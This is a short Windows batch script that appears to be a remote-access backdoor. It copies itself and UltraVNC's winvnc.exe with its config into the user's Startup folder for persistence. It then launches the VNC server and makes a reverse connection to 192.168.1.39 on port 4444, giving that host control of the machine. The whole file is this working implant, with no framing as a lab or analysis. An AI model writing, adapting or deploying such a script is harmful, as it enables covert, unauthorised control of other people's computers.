@echo off
set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

if not exist "%startup_folder%\%~nx0" (
  copy "%~f0" "%startup_folder%\"
)

copy "C:\Users\goose\Downloads\UltraVNC_1500-dev\x64\Client\ultravnc.ini" "%startup_folder%\"
copy "C:\Users\goose\Downloads\UltraVNC_1500-dev\x64\Client\winvnc.exe" "%startup_folder%\"

start winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect 192.168.1.39::4444
